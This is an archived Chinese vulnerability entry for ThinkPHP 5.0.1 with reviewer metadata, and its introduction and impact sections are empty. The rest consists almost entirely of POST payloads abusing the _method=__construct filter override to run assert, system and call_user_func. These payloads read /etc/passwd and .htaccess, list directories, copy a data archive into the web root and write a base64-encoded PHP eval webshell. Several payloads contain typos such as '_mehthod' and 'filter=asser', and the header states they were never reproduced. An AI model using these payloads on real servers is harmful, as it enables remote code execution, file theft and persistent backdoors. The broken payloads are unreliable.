---
source: "hatch 补库批 20260928"
product: "ThinkPHP / Request覆盖及assert"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 5.0.1"
prerequisites: "来源所述条件，未列明部分仍待核：仅标题 5.0.1；无完整影响/修复范围，未独立证实该版本可利用"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-fb8d90a5ebc4da01a3e0adf4"
entity_id: "ve-fb8d90a5ebc4da01a3e0adf4"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅标题 5.0.1；无完整影响/修复范围，未独立证实该版本可利用

代码与实验材料：已全文读取全部载荷；仅静态分析，没有实验响应；部分包含写文件/下载副作用

来源证据范围：只有hatch补库标签，无原作者或原始漏洞资料

- **适用与权限边界（1）**：前提、证据和归属不足；依据：poc2写_mehthod、__construct$method，copy结尾filter=asser；缺PHP版本和debug/路由条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（2）**：以单版本拆文件造成重复和误导；依据：简介及影响范围为空，标题版本不能代替实际组件/配置验证。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 5.0.1

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、判断是否存在漏洞

#### poc1

    http://wwww.com/public

    s=phpinfo()&_method=__construct&filter=assert
    _method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo
    _method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
    _method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1

#### poc2

    http:/xxxx.com/?s=index/index/index

    s=ipconfig&_mehthod=__construct$method=&filter[]=system

### 2、深入利用

使用post提交

#### 1、使用assert函数

    s=phpinfo()&_method=__construct&filter=assert

#### 2、include函数，可以根据此函数查看一些文件及其配置

    s=include("/etc/passwd")&_method=__construct&filter=assert

#### 3、file\_put\_contents函数，可以直接写入文件

    s=file_put_contents('/data/wwwroot/www.0-sec.org/application/index/test.php',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4'))&_method=__construct&filter=assert

#### 4、读取文件

    _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=../application/.htaccess
    s=include("../application/.htaccess")&_method=__construct&filter=assert

    //ps:如果不加.. 请加上完整路径

#### 5、var\_dump函数，可以查看该路径下的文件，文件夹

    s=var_dump(scandir('../application/'))&_method=__construct&filter=assert

#### 6、复制文件

    s=copy("/data/wwwroot/data.tar", "/data/wwwroot/www.0-sec.org/public/data.tar")&_method=__construct&filter=asser
